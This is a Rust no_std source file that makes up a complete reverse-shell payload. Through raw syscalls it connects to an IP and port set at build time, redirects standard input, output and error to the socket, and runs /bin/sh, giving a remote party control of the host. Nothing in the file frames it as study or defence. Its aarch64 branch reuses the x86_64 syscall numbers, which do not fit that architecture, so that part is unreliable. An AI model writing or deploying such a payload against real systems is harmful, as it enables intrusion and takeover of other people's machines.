#![no_main]
#![no_std]
#![feature(addr_parse_ascii)]
use core::arch::asm;

const PORT: &str = core::env!("PORT");
const IP: &str = core::env!("IP");

const SYS_DUP2: usize = 33;
const SYS_SOCKET: usize = 41;
const SYS_CONNECT: usize = 42;
const SYS_EXECVE: usize = 59;

const AF_INET: usize = 2;
const SOCK_STREAM: usize = 1;
const IPPROTO_IP: usize = 0;

const STDIN: usize = 0;
const STDOUT: usize = 1;
const STDERR: usize = 2;

#[repr(C)]
struct sockaddr_in {
    sin_family: u16,
    sin_port: u16,
    sin_addr: in_addr,
    sin_zero: [u8; 8],
}

#[repr(C)]
struct in_addr {
    s_addr: u32,
}
#[cfg(target_arch = "x86_64")]
unsafe fn syscall2(syscall: usize, arg1: usize, arg2: usize) -> usize {
    let ret: usize;
    asm!(
        "syscall",
        in("rax") syscall,
        in("rdi") arg1,
        in("rsi") arg2,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
        options(nostack),
    );
    ret
}
#[cfg(target_arch = "x86_64")]
unsafe fn syscall3(syscall: usize, arg1: usize, arg2: usize, arg3: usize) -> usize {
    let ret: usize;
    asm!(
        "syscall",
        in("rax") syscall,
        in("rdi") arg1,
        in("rsi") arg2,
        in("rdx") arg3,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
        options(nostack),
    );
    ret
}

#[cfg(target_arch = "aarch64")]
unsafe fn syscall2(syscall: usize, arg1: usize, arg2: usize) -> usize {
    let ret: usize;
    asm!(
        "svc #0",
        in("x8") syscall,
        in("x0") arg1,
        in("x1") arg2,
        lateout("x0") ret,
        options(nostack)
    );
    ret
}

#[cfg(target_arch = "aarch64")]
unsafe fn syscall3(syscall: usize, arg1: usize, arg2: usize, arg3: usize) -> usize {
    let ret: usize;
    asm!(
        "svc #0",
        in("x8") syscall,
        in("x0") arg1,
        in("x1") arg2,
        in("x2") arg3,
        lateout("x0") ret,
        options(nostack)
    );
    ret
}
#[cfg(target_arch = "x86_64")]
pub unsafe fn exit(ret: usize) -> ! {
    let sys_nr: usize = 60;
    asm!(
    "syscall",
    in("rax") sys_nr,
    in("rdi") ret,
    options(noreturn),
    );
}
#[cfg(target_arch = "aarch64")]
pub unsafe fn exit(ret: usize) -> ! {
    let sys_nr: usize = 60;
    asm!(
    "svc #0",
    in("x8") sys_nr,
    in("x0") ret,
    options(noreturn),
    );
}

pub fn ip_str_to_beu32(ipv4_str: &str) -> u32 {
    let ip_it = ipv4_str.split('.');
    let mut r = [0u8; 4];
    for (idx, b) in ip_it.enumerate() {
        r[idx] = b.parse::<u8>().unwrap()
    }
    let mut res = (r[0] as u32) << 24;
    res |= (r[1] as u32) << 16;
    res |= (r[2] as u32) << 8;
    res |= r[3] as u32;
    res.to_be()
}

#[no_mangle]
fn _start() -> ! {
    let shell: &str = "/bin/sh\x00";
    let argv: [*const &str; 2] = [&shell, core::ptr::null()];
    let ip: u32 = ip_str_to_beu32(IP);
    let socket_addr = sockaddr_in {
        sin_family: AF_INET as u16,
        sin_port: PORT.parse::<u16>().unwrap().to_be(),
        sin_addr: in_addr { s_addr: ip },
        sin_zero: [0; 8],
    };
    let socket_addr_len = core::mem::size_of::<sockaddr_in>();

    unsafe {
        let socket_fd = syscall3(SYS_SOCKET, AF_INET, SOCK_STREAM, IPPROTO_IP);
        syscall3(
            SYS_CONNECT,
            socket_fd,
            &socket_addr as *const sockaddr_in as usize,
            socket_addr_len as usize,
        );

        syscall2(SYS_DUP2, socket_fd, STDIN);
        syscall2(SYS_DUP2, socket_fd, STDOUT);
        syscall2(SYS_DUP2, socket_fd, STDERR);

        syscall3(
            SYS_EXECVE,
            shell.as_ptr() as usize,
            argv.as_ptr() as usize,
            0,
        );
        exit(0);
    };
}
#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}
